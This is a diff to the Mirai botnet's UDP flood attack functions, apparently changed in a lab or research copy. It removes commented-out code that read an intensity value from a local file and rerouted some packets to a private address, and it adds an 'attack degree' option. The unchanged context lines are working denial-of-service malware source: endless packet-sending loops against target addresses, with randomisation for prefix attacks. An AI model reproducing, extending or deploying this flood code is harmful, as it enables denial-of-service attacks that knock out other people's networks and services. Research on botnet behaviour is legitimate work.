@@ -84,17 +84,6 @@ void attack_udp_generic(uint8_t targs_len, struct attack_target *targs, uint8_t 
         udph->dest = htons(dport);
         udph->len = htons(sizeof (struct udphdr) + data_len);
     }
-//uint32_t conf,conf_fscanf,rand;
-//int conf_int;
-//FILE *fp;
-//if((fp=fopen("/home/odroid/Desktop/20161215/MiraiBOT/Mirai-Source-Code-master/mirai/smpl.txt","r"))==NULL){
-  //      printf("file open error!¥n");
-    //    conf==100;
-      //  }
-//conf_fscanf=fscanf(fp,"%d",&conf_int);
-//conf=(uint32_t)conf_int;
-//fclose(fp);
-
 	while (TRUE)
     {
       for (i = 0; i < targs_len; i++)
@@ -104,12 +93,6 @@ void attack_udp_generic(uint8_t targs_len, struct attack_target *targs, uint8_t 
             struct udphdr *udph = (struct udphdr *)(iph + 1);
             char *data = (char *)(udph + 1);
 
-//rand=(rand_next())%100;
-//if(rand>=conf){
-    //    iph->daddr = INET_ADDR(10,201,202,203);//targs[i].addr;
-//}else{
-  //      iph->daddr = targs[i].addr;
-//}
             // For prefix attacks
             if (targs[i].netmask < 32)
                 iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
@@ -218,24 +201,13 @@ void attack_udp_vse(uint8_t targs_len, struct attack_target *targs, uint8_t opts
         util_memcpy(data, vse_payload, vse_payload_len);
     }
 
+	//attack degree adjustment
+        uint32_t conf = attack_get_opt_int(opts_len, opts, ATK_OPT_DEGREE, 100);
 	//0.001ms
 	struct timespec req = {0,1000};
 	uint32_t rand;
 	int fc;
-	//uint32_t conf,conf_fscanf,rand;
-	//int conf_int;
-	//FILE *fp;
-	/*if((fp=fopen("/home/odroid/Desktop/20161215/MiraiBOT/Mirai-Source-Code-master/mirai/smpl.txt","r"))==NULL){
-        	printf("file open error!¥n");
-        	conf==100;
-    	}
-	conf_fscanf=fscanf(fp,"%d",&conf_int);
-	conf=(uint32_t)conf_int;
-	fclose(fp);
-*/
-	//attack degree adjustment
-	uint32_t conf = attack_get_opt_int(opts_len, opts, ATK_OPT_DEGREE, 100);
-	printf("[attack_vse]%d",conf);
+	//printf("[attack_vse]%d",conf);
 
     while (TRUE)
     {
@@ -252,15 +224,6 @@ void attack_udp_vse(uint8_t targs_len, struct attack_target *targs, uint8_t opts
             char *pkt = pkts[i];
             struct iphdr *iph = (struct iphdr *)pkt;
             struct udphdr *udph = (struct udphdr *)(iph + 1);
-
-//bad idea
-/*rand=(rand_next())%100;
-if(rand>=conf){
-        iph->daddr = INET_ADDR(10,201,202,203);//targs[i].addr;
-}else{
-        iph->daddr = targs[i].addr;
-}*/ 
-           
             // For prefix attacks
             if (targs[i].netmask < 32)
                 iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
@@ -488,21 +451,6 @@ void attack_udp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t op
             return;
         }
 
-
-/*
-uint32_t conf,conf_fscanf,rand;
-int conf_int;
-FILE *fp;
-if((fp=fopen("/home/odroid/Desktop/20161215/MiraiBOT/Mirai-Source-Code-master/mirai/smpl.txt","r"))==NULL){
-        printf("file open error!¥n");
-        conf==100;
-        }
-conf_fscanf=fscanf(fp,"%d",&conf_int);
-conf=(uint32_t)conf_int;
-fclose(fp);
-*/
-
-
         bind_addr.sin_family = AF_INET;
         bind_addr.sin_port = sport;
         bind_addr.sin_addr.s_addr = 0;
@@ -539,15 +487,6 @@ fclose(fp);
             // Randomize packet content?
             if (data_rand)
                 rand_str(data, data_len);
-
-/*
-rand=(rand_next())%100;
-if(rand>=conf){
-        iph->daddr = INET_ADDR(10,201,202,203);//targs[i].addr;
-}else{
-        iph->daddr = targs[i].addr;
-}
-*/
 
 /*#ifdef DEBUG
             errno = 0;
